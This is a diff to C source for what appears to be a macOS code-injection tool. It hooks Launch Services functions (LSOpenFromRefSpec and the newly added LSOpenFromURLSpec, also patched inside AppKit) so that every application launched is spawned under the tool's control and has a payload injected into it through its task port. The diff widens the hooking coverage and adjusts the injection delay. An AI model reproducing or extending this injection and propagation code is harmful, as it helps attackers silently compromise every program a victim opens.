@@ -46,6 +46,19 @@ static char installer[] = "/System/Library/CoreServices/Installer.app/Contents/M
 /* Launch Services interposers */
 #include <CoreServices/CoreServices.h>
 /* Right now, we pull in the CoreServices framework.  This is not needed */
+
+
+typedef OSStatus (*LSOpenFromURLSpec_t)(const LSLaunchURLSpec *inLaunchSpec,
+                                        CFURLRef *outLaunchedURL);
+
+OSStatus p0_LSOpenFromURLSpec(const LSLaunchURLSpec *inLaunchSpec,
+                                    CFURLRef *outLaunchedURL) {
+  /* appURL, itemURLs, passThruParams, launchFlags, asyncRefCon */
+  LSOpenFromURLSpec_t orig = LSOpenFromURLSpec;
+  p0_logf(P0_INFO, "LSOpenFromURLSpec called");
+  return orig(inLaunchSpec, outLaunchedURL);
+}
+
 typedef OSStatus (*LSOpenFromRefSpec_t)(const LSLaunchFSRefSpec*, FSRef*);
 OSStatus p0_LSOpenFromRefSpec(const LSLaunchFSRefSpec *inLaunchSpec,
                               FSRef *outLaunchedRef) {
@@ -103,7 +116,7 @@ OSStatus p0_LSOpenFromRefSpec(const LSLaunchFSRefSpec *inLaunchSpec,
       if (fork() == 0) { /* async ;-) */
         if (spawn(args[0], args, envs, &taskport, -1) > 0) {
           thread_act_t thread;
-          time_t wait_until = time(NULL) + 2;  /* 2 seconds. */
+          time_t wait_until = time(NULL) + 3;  /* 3 seconds. */
           while (time(NULL) < wait_until) { sched_yield(); }
           p0_logf(P0_INFO, "launched '%s'", path);
           /* Now we inject the payload.
@@ -151,6 +164,11 @@ void run(unsigned char *code, uint32_t size) {
   /* Install interposition agents */
   mach_jump_init();
   mach_jump_patch("LSOpenFromRefSpec", p0_LSOpenFromRefSpec);
+  mach_jump_patch("LSOpenFromURLSpec", p0_LSOpenFromURLSpec);
+  /* TODO: make patch walk all loaded libraries */
+  mach_jump_framework_patch("AppKit",
+                            "LSOpenFromURLSpec",
+                            p0_LSOpenFromURLSpec);
 
   /* TODO: if we are n finder, we should kill any others. */
 
